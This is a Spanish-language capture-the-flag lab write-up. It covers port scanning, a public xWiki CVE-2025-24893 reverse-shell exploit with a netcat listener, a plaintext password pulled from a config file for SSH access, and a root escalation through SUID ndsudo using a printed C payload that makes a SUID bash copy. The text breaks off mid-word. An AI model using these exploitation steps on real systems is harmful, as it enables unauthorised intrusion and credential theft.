#xWiki #RCE 

## Reconocimiento
Empezamos la maquina realizando un reconocimiento de puertos y servicios con [[NMAP]]:
`nmap -sS -p- --open --min-rate 5000 -n -Pn -vvv 10.10.11.80 -oG allPorts`

Encontramos los puertos `22, 80, 8080`

Añadimos la maquina al fichero `/etc/hosts`

Navegamos al puerto `80` por la web y encontramos que en el apartado `Docs` nos redirige a `wiki.editor.htb` para poder verlo correctamente lo volvemos a añadir al `/etc/hosts`

Navegando en la web de `http://wiki.editor.htb/xwiki/bin/view/Main/` vemos que la versión de `xWiki` es la `15.10.8`

Buscamos en internet información sobre esta versión y encontramos que es vulnerable a RCE, usamos el exploit de GitHub `https://github.com/Bishben/xwiki-15.10.8-reverse-shell-cve-2025-24893`
el cual nos explica como explotarlo.

## Explotación
Para explotarlo necesitamos ponernos primero en escucha con [[NETCAT]] en un puerto de nuestra maquina `nc -nlvp 4444`

Después deberemos ejecutar el Python 
`python3 cve-2025-24893.py <target_base_url> <lhost> <lport>`

En nuestro listenner obtendremos una Shell como `xWiki`

## Escalada de Privilegios
Si navegamos al directorio `/home` vemos que hay un usuario `Oliver`, para poder pivotar a el, buscaremos información en los archivos de configuración de `xWiki`

Estos ficheros de configuración se encuentran en `/usr/lib/xwiki/WEB-INF` exactamente miraremos el archivo `hibernate.cfg.xml`
En este archivo filtraremos por la palabra `password`
`cat hibernate.cfg.xml | grep "password"` encontramos una línea que nos indica la siguiente contraseña `theEd1t0rTeam99`

Probamos a conectar por SSH al usuario `Oliver` con `ssh oliver@10.10.11.80`
Confirmamos que las credenciales son `oliver::theEd1t0rTeam99`

Ahora tenemos que escalar privilegios a `root`
Probamos a ver que programas podemos ejecutar como root con `sudo -l`
y no nos otorga ninguna información

Probamos con los permisos SUID `find / -perm -4000 2>/dev/null`
Encontramos este fichero `/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo`
Buscamos información sobre el en internet y descubrimos que es una herramienta diseñada para ejecutar programas con privilegios elevados, encontramos también un POC de escalada de privilegios y lo seguimos paso por paso `https://xsec.sh/blog/untrusted-search-path/`

En nuestra maquina atacante crearemos un fichero `nano nvme.c`
Con el siguiente contedio
```C
#include <unistd.h>
#include <stdlib.h>
int main() {

setuid(0);
setgid(0);
system("cp /bin/bash /tmp/pwn && chmod +s /tmp/pwn");
return 0;
}
```

Este script crea una bash en la carpeta actual y le asigna permisos para conseguir correr `bash -p`

Lo compilarem